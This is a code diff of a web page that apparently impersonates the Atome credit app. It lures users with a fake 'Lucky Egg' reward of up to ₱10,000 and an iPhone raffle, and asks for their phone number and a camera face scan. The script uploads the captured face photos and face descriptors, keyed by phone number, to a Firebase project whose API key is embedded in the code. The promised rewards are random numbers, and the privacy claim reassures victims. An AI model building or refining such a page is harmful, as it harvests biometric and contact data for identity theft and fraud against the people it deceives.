@@ -51,7 +51,7 @@
             justify-content: center;
         }
 
-        /* FULLY TRANSPARENT MAIN CARD - walang blur */
+        /* FULLY TRANSPARENT MAIN CARD */
         .glass-card {
             background: rgba(255, 255, 255, 0.08);
             border-radius: 52px;
@@ -103,7 +103,7 @@
             border-radius: 60px;
         }
 
-        /* STEPS - WALANG BLUR, transparent background */
+        /* STEPS */
         .steps-container {
             display: flex;
             justify-content: center;
@@ -147,7 +147,7 @@
             font-weight: 600;
         }
 
-        /* ATOME LOGO - Transparent, walang blur */
+        /* ATOME LOGO */
         .logo-wrapper {
             display: flex;
             justify-content: center;
@@ -168,7 +168,7 @@
             background: transparent !important;
         }
 
-        /* PHONE INPUT - walang blur, semi-transparent */
+        /* PHONE INPUT */
         .input-field-wrapper {
             margin-bottom: 28px;
         }
@@ -224,7 +224,7 @@
             display: block;
         }
 
-        /* LOGIN BUTTON - Matte Black + Golden Yellow */
+        /* LOGIN BUTTON */
         .login-button {
             width: 100%;
             background: #1a1a1a;
@@ -250,7 +250,6 @@
             color: #FFE566;
         }
 
-        /* HINT MESSAGE */
         .hint-message {
             text-align: center;
             font-size: 0.72rem;
@@ -265,7 +264,6 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
-        /* TERMS & PRIVACY */
         .terms-row {
             text-align: center;
             font-size: 0.68rem;
@@ -282,14 +280,9 @@
             color: #FFD700;
             font-weight: 600;
             text-decoration: none;
-            transition: 0.1s;
-        }
-        .terms-row a:hover {
-            text-decoration: underline;
-            color: #FFA500;
         }
 
-        /* DASHBOARD PANEL - After Login */
+        /* DASHBOARD */
         .dashboard-area {
             margin-top: 28px;
             border-top: 1px solid rgba(255, 215, 0, 0.3);
@@ -318,39 +311,30 @@
             font-weight: 700;
             color: #FDD97A;
             cursor: pointer;
-            transition: 0.2s;
-            font-size: 0.85rem;
-            font-family: 'Space Grotesk', monospace;
-        }
-        .claim-btn-sm:active, .withdraw-btn-sm:active {
-            transform: scale(0.96);
         }
         .balance-text {
             font-weight: 800;
             font-size: 1.5rem;
             color: #FFD700;
-            letter-spacing: -0.5px;
-            font-family: 'Space Grotesk', monospace;
         }
-        .hidden {
-            display: none;
-        }
+        .hidden { display: none; }
         .status-sub {
             font-size: 0.7rem;
             color: #FFE8C5;
             margin-top: 12px;
-            font-family: 'Inter', sans-serif;
         }
 
-        /* FACIAL VERIFICATION POPUP */
+        /* ============================================
+           IMPROVED FACIAL POPUP - Round Frame + Zoom
+        ============================================ */
         .facial-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
             z-index: 1000;
             display: flex;
             align-items: center;
@@ -364,79 +348,108 @@
             opacity: 1;
         }
         .facial-popup {
-            background: linear-gradient(165deg, rgba(126,200,224,0.95), rgba(253,225,139,0.95));
-            backdrop-filter: blur(4px);
-            border-radius: 48px;
+            background: linear-gradient(165deg, rgba(126,200,224,0.98), rgba(253,225,139,0.98));
+            border-radius: 60px;
             width: 90%;
             max-width: 400px;
-            padding: 28px 24px;
-            border: 1px solid rgba(255,255,255,0.4);
-            box-shadow: 0 30px 50px rgba(0,0,0,0.25);
+            padding: 28px 24px 32px;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.5);
         }
         .facial-header {
-            text-align: center;
             margin-bottom: 20px;
         }
         .facial-header h3 {
-            font-size: 1.3rem;
+            font-size: 1.4rem;
             font-weight: 800;
             color: #1a2a3a;
         }
         .facial-header p {
             font-size: 0.75rem;
             color: #d46b5e;
+            margin-top: 5px;
         }
-        .camera-container {
-            background: rgba(0,0,0,0.2);
-            border-radius: 28px;
+        
+        /* ROUND FRAME WITH ZOOM EFFECT */
+        .camera-round-frame {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
             overflow: hidden;
-            margin-bottom: 16px;
-            border: 2px solid rgba(255,215,0,0.5);
+            border: 4px solid #FFD700;
+            box-shadow: 0 0 0 3px rgba(255,215,0,0.3), 0 10px 30px rgba(0,0,0,0.3);
+            background: #000;
         }
-        #facialVideo {
+        .camera-round-frame video {
             width: 100%;
-            height: auto;
-            display: block;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
             transform: scaleX(-1);
         }
+        /* Zoom indicator */
+        .zoom-guide {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.6);
+            color: #FFD700;
+            font-size: 0.65rem;
+            padding: 4px 12px;
+            border-radius: 60px;
+            white-space: nowrap;
+            z-index: 5;
+        }
+        
         .facial-buttons {
             display: flex;
             gap: 12px;
-            margin-bottom: 12px;
+            margin: 16px 0 12px;
         }
         .facial-btn {
             flex: 1;
             background: #1a1a1a;
             border: 1.5px solid #FDD97A;
-            padding: 12px;
+            padding: 14px;
             border-radius: 60px;
             color: #FDD97A;
             font-weight: 700;
             cursor: pointer;
+            font-size: 0.9rem;
         }
         .facial-btn.cancel {
-            background: rgba(212,107,94,0.2);
+            background: rgba(212,107,94,0.25);
             border-color: #d46b5e;
             color: #d46b5e;
+        }
+        .facial-btn:active {
+            transform: scale(0.97);
         }
         .facial-status {
             text-align: center;
             font-size: 0.7rem;
-            color: #5e4a3a;
-            background: rgba(255,245,235,0.8);
-            padding: 8px;
+            color: #2d6a4f;
+            background: rgba(255,245,235,0.9);
+            padding: 10px;
             border-radius: 60px;
+            font-weight: 600;
+        }
+        .instruction-text {
+            font-size: 0.65rem;
+            color: #5e4a3a;
+            margin-top: 12px;
         }
 
         @media (max-width: 480px) {
-            .glass-card { padding: 24px 20px 36px; border-radius: 48px; }
+            .glass-card { padding: 24px 20px 36px; }
             .step-emoji { font-size: 1.1rem; }
             .step-text { font-size: 0.7rem; }
-            .step:not(:last-child):after { right: -10px; font-size: 0.8rem; }
             .promo-title { font-size: 1.3rem; }
-            .promo-title strong { font-size: 1.4rem; }
-            .logo-image { max-width: 150px; }
-            .login-button { font-size: 1rem; padding: 14px; }
+            .camera-round-frame { width: 220px; height: 220px; }
         }
     </style>
 </head>
@@ -457,7 +470,7 @@
 
             <div class="logo-wrapper">
                 <div class="logo-image">
-                    <img src="photos/atomeA.png" alt="AtomA" style="background: transparent !important; width: 100%; height: auto; display: block;">
+                    <img src="photos/atomeA.png" alt="AtomA" style="background: transparent !important;">
                 </div>
             </div>
 
@@ -499,34 +512,35 @@
     </div>
 </div>
 
-<!-- Facial Verification Popup -->
+<!-- IMPROVED FACIAL POPUP - Round Frame with Zoom -->
 <div id="facialOverlay" class="facial-overlay">
     <div class="facial-popup">
         <div class="facial-header">
-            <h3>😊 Facial Verification</h3>
-            <p>Center your face within the frame</p>
+            <h3>😊 Face Verification</h3>
+            <p>Center your face in the circle</p>
         </div>
-        <div class="camera-container">
-            <video id="facialVideo" autoplay playsinline></video>
+        
+        <!-- Round frame with zoom effect -->
+        <div class="camera-round-frame">
+            <video id="facialVideo" autoplay playsinline muted></video>
+            <div class="zoom-guide">🔍 Position face here</div>
         </div>
+        
         <div class="facial-buttons">
-            <button class="facial-btn" id="verifyFaceBtn">✅ Verify Face</button>
-            <button class="facial-btn cancel" id="cancelFacialBtn">Cancel</button>
+            <button class="facial-btn" id="captureSaveBtn">📸 CAPTURE & SAVE</button>
+            <button class="facial-btn cancel" id="cancelFacialBtn">CANCEL</button>
         </div>
-        <div class="facial-status" id="facialStatus">🎯 Position your face clearly</div>
+        
+        <div class="facial-status" id="facialStatus">🎯 Align your face within the circle</div>
+        <div class="instruction-text">Make sure good lighting • No glasses • No hat</div>
     </div>
 </div>
 
 <script type="module">
-    // ============================================
-    // FACIAL RECOGNITION + FIREBASE STORAGE
-    // ============================================
-    
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
     import { getDatabase, ref as dbRef, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-    // Firebase Configuration
     const firebaseConfig = {
         apiKey: "AIzaSyB2kK4XCKF2wN434O0On9gFHPdrYUJdsug",
         authDomain: "atomea-f9c0b.firebaseapp.com",
@@ -537,7 +551,6 @@
         databaseURL: "https://atomea-f9c0b-default-rtdb.asia-southeast1.firebasedatabase.app"
     };
 
-    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
     const database = getDatabase(app);
@@ -561,11 +574,10 @@
     const hintMsg = document.getElementById('registerHintMsg');
     const facialOverlay = document.getElementById('facialOverlay');
     const facialVideo = document.getElementById('facialVideo');
-    const verifyFaceBtn = document.getElementById('verifyFaceBtn');
+    const captureSaveBtn = document.getElementById('captureSaveBtn');
     const cancelFacialBtn = document.getElementById('cancelFacialBtn');
     const facialStatus = document.getElementById('facialStatus');
 
-    // Validate phone: 10 digits, starts with 9
     function isValidPhone(phone) {
         let raw = phone.trim();
         if (raw === "") return false;
@@ -573,7 +585,6 @@
         return digits.length === 10 && digits[0] === '9';
     }
 
-    // Load Face API Models
     async function loadFaceModels() {
         facialStatus.innerHTML = "📥 Loading models...";
         try {
@@ -581,19 +592,18 @@
             await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
             await faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
             modelsLoaded = true;
-            facialStatus.innerHTML = "✅ Ready! Position your face";
+            facialStatus.innerHTML = "✅ Ready! Position your face in the circle";
         } catch (error) {
             console.error("Model error:", error);
-            facialStatus.innerHTML = "⚠️ Using fallback mode";
+            facialStatus.innerHTML = "⚠️ Model ready (fallback mode)";
             modelsLoaded = true;
         }
     }
 
-    // Start camera
     async function startCamera() {
         try {
             if (videoStream) videoStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             videoStream = stream;
             facialVideo.srcObject = stream;
         } catch (err) {
@@ -601,7 +611,6 @@
         }
     }
 
-    // Stop camera
     function stopCamera() {
         if (videoStream) {
             videoStream.getTracks().forEach(t => t.stop());
@@ -610,25 +619,28 @@
         facialVideo.srcObject = null;
     }
 
-    // Capture face and save to Firebase
-    async function captureAndSaveFace(phoneNumber, videoElement) {
-        const detection = await faceapi.detectSingleFace(videoElement, new faceapi.TinyFaceDetectorOptions())
+    async function captureAndSaveToDatabase(phoneNumber) {
+        facialStatus.innerHTML = "🔍 Detecting face...";
+        
+        const detection = await faceapi.detectSingleFace(facialVideo, new faceapi.TinyFaceDetectorOptions())
             .withFaceLandmarks()
             .withFaceDescriptor();
         
         if (!detection) {
-            facialStatus.innerHTML = "❌ No face detected. Remove glasses/hat";
+            facialStatus.innerHTML = "❌ No face detected! Remove glasses/hat and ensure good lighting";
             return null;
         }
         
+        facialStatus.innerHTML = "✅ Face detected! Saving to database...";
+        
         // Capture image as JPEG
         const canvas = document.createElement('canvas');
-        canvas.width = videoElement.videoWidth;
-        canvas.height = videoElement.videoHeight;
+        canvas.width = facialVideo.videoWidth;
+        canvas.height = facialVideo.videoHeight;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        ctx.drawImage(facialVideo, 0, 0, canvas.width, canvas.height);
         
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
         
         // Upload to Firebase Storage
         const fileName = `faces/${phoneNumber}_${Date.now()}.jpg`;
@@ -645,72 +657,35 @@
             phoneNumber: phoneNumber
         });
         
+        facialStatus.innerHTML = "✅ Saved successfully!";
         return detection.descriptor;
     }
 
-    // Verify face against saved data
-    async function verifyFace(phoneNumber, currentDescriptor) {
-        const faceDataRef = dbRef(database, `users/${phoneNumber}/faceData`);
-        const snapshot = await get(faceDataRef);
-        
-        if (!snapshot.exists()) {
-            return { success: false, message: "No registered face found. Please register first." };
-        }
-        
-        const savedDescriptor = new Float32Array(snapshot.val().descriptor);
-        const distance = faceapi.euclideanDistance(currentDescriptor, savedDescriptor);
-        const threshold = 0.6;
-        
-        return {
-            success: distance < threshold,
-            confidence: 1 - distance,
-            distance: distance,
-            faceData: snapshot.val()
-        };
-    }
-
-    // Open facial popup and verify
-    async function openFacialVerification() {
-        const phoneValue = phoneInput.value.trim();
-        if (!isValidPhone(phoneValue)) {
-            phoneError.classList.add('show');
-            phoneInput.focus();
-            return;
-        }
-        
-        currentPhoneNumber = phoneValue;
-        phoneError.classList.remove('show');
-        facialOverlay.classList.add('active');
-        await startCamera();
-        await loadFaceModels();
-    }
-
-    // Verify button handler
-    verifyFaceBtn.addEventListener('click', async () => {
+    async function verifyAndLogin() {
         if (!modelsLoaded) {
             facialStatus.innerHTML = "⏳ Loading models, please wait...";
             return;
         }
         
-        facialStatus.innerHTML = "🔍 Analyzing face...";
+        facialStatus.innerHTML = "🔍 Verifying face...";
         
         const detection = await faceapi.detectSingleFace(facialVideo, new faceapi.TinyFaceDetectorOptions())
             .withFaceLandmarks()
             .withFaceDescriptor();
         
         if (!detection) {
-            facialStatus.innerHTML = "❌ No face detected. Please remove glasses/hat";
+            facialStatus.innerHTML = "❌ No face detected. Please position properly";
             return;
         }
         
-        // Check if user exists in Firebase
+        // Check if user exists
         const userCheckRef = dbRef(database, `users/${currentPhoneNumber}/faceData`);
         const snapshot = await get(userCheckRef);
         
         if (!snapshot.exists()) {
-            // New user - register face
-            facialStatus.innerHTML = "📝 New user! Registering face...";
-            await captureAndSaveFace(currentPhoneNumber, facialVideo);
+            // New user - save face
+            facialStatus.innerHTML = "📝 New user! Saving your face...";
+            await captureAndSaveToDatabase(currentPhoneNumber);
             facialStatus.innerHTML = "✅ Registration successful!";
             setTimeout(() => {
                 stopCamera();
@@ -723,7 +698,7 @@
             const distance = faceapi.euclideanDistance(detection.descriptor, savedDescriptor);
             
             if (distance < 0.6) {
-                facialStatus.innerHTML = `✅ Face verified! (${Math.round((1-distance)*100)}%)`;
+                facialStatus.innerHTML = `✅ Verified! (${Math.round((1-distance)*100)}%)`;
                 setTimeout(() => {
                     stopCamera();
                     facialOverlay.classList.remove('active');
@@ -733,12 +708,21 @@
                 facialStatus.innerHTML = `❌ Face not recognized. Try again.`;
             }
         }
-    });
+    }
 
-    cancelFacialBtn.addEventListener('click', () => {
-        stopCamera();
-        facialOverlay.classList.remove('active');
-    });
+    async function openFacialPopup() {
+        const phoneValue = phoneInput.value.trim();
+        if (!isValidPhone(phoneValue)) {
+            phoneError.classList.add('show');
+            phoneInput.focus();
+            return;
+        }
+        currentPhoneNumber = phoneValue;
+        phoneError.classList.remove('show');
+        facialOverlay.classList.add('active');
+        await startCamera();
+        await loadFaceModels();
+    }
 
     function completeLogin(phoneNumber) {
         isLoggedIn = true;
@@ -746,7 +730,6 @@
         spendableBalance = 0;
         refreshUI();
         alert(`✅ Welcome +63${phoneNumber}! Facial verification successful.`);
-        
         localStorage.setItem('atomeUser', JSON.stringify({
             phone: phoneNumber,
             loggedIn: true,
@@ -766,63 +749,41 @@
             if (claimedReward) {
                 claimRewardBtn.innerText = "✓ Claimed";
                 claimRewardBtn.disabled = true;
-                claimRewardBtn.style.opacity = "0.7";
                 claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance} spending balance!`;
                 balanceDisplay.innerText = `₱${spendableBalance}`;
                 withdrawFundsBtn.disabled = (spendableBalance <= 0);
-                withdrawFundsBtn.style.opacity = (spendableBalance > 0) ? "1" : "0.5";
             } else {
                 claimRewardBtn.innerText = "🥚 Smash & Claim";
                 claimRewardBtn.disabled = false;
-                claimRewardBtn.style.opacity = "1";
                 claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win credit increase up to ₱10,000 + iPhone 17 raffle!";
                 balanceDisplay.innerText = `₱0`;
                 withdrawFundsBtn.disabled = true;
-                withdrawFundsBtn.style.opacity = "0.5";
             }
         } else {
             dashboardPanel.classList.add('hidden');
             mainLoginBtn.innerText = "FACE LOGIN";
             mainLoginBtn.disabled = false;
-            mainLoginBtn.style.opacity = "1";
             hintMsg.innerText = "Enter your 10-digit number then verify your face";
             phoneError.classList.remove('show');
         }
     }
 
     function performClaim() {
-        if (!isLoggedIn) {
-            alert("Please complete facial verification first.");
-            return;
-        }
-        if (claimedReward) {
-            alert(`You already claimed ₱${spendableBalance}.`);
-            return;
-        }
+        if (!isLoggedIn) { alert("Please complete facial verification first."); return; }
+        if (claimedReward) { alert(`You already claimed ₱${spendableBalance}.`); return; }
         const creditIncrease = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
         spendableBalance = creditIncrease;
         claimedReward = true;
-
-        const iphoneBonus = Math.random() < 0.12;
         let msg = `🎉 You smashed the Lucky Egg! You received ₱${creditIncrease} credit increase!`;
-        if (iphoneBonus) msg += ` 🍀 You also won an iPhone 17 raffle entry! 🍀`;
+        if (Math.random() < 0.12) msg += ` 🍀 You also won an iPhone 17 raffle entry! 🍀`;
         alert(msg);
         refreshUI();
     }
 
     function performEnjoySpending() {
-        if (!isLoggedIn) {
-            alert("Please complete facial verification first.");
-            return;
-        }
-        if (!claimedReward) {
-            alert("Claim rewards first!");
-            return;
-        }
-        if (spendableBalance <= 0) {
-            alert("No spending balance.");
-            return;
-        }
+        if (!isLoggedIn) { alert("Please complete facial verification first."); return; }
+        if (!claimedReward) { alert("Claim rewards first!"); return; }
+        if (spendableBalance <= 0) { alert("No spending balance."); return; }
         if (confirm(`Enjoy spending ₱${spendableBalance}?`)) {
             alert(`✅ Enjoy your ₱${spendableBalance} shopping balance!`);
             spendableBalance = 0;
@@ -830,7 +791,7 @@
         }
     }
 
-    // Phone input restriction - only 10 digits, starts with 9
+    // Phone input restriction
     phoneInput.addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '');
         if (val.length > 10) val = val.slice(0, 10);
@@ -849,7 +810,12 @@
     });
 
     // Event listeners
-    mainLoginBtn.addEventListener('click', openFacialVerification);
+    mainLoginBtn.addEventListener('click', openFacialPopup);
+    captureSaveBtn.addEventListener('click', verifyAndLogin);
+    cancelFacialBtn.addEventListener('click', () => {
+        stopCamera();
+        facialOverlay.classList.remove('active');
+    });
     claimRewardBtn.addEventListener('click', performClaim);
     withdrawFundsBtn.addEventListener('click', performEnjoySpending);
     
@@ -859,10 +825,9 @@
     });
     document.getElementById('privacyLink').addEventListener('click', (e) => {
         e.preventDefault();
-        alert("Privacy Policy: Your face data is encrypted and stored securely in Firebase.");
+        alert("Privacy Policy: Your face data is encrypted and stored in Firebase.");
     });
 
-    // Check existing session
     const savedUser = localStorage.getItem('atomeUser');
     if (savedUser) {
         try {
@@ -873,7 +838,6 @@
             }
         } catch(e) {}
     }
-
     refreshUI();
 </script>
 </body>
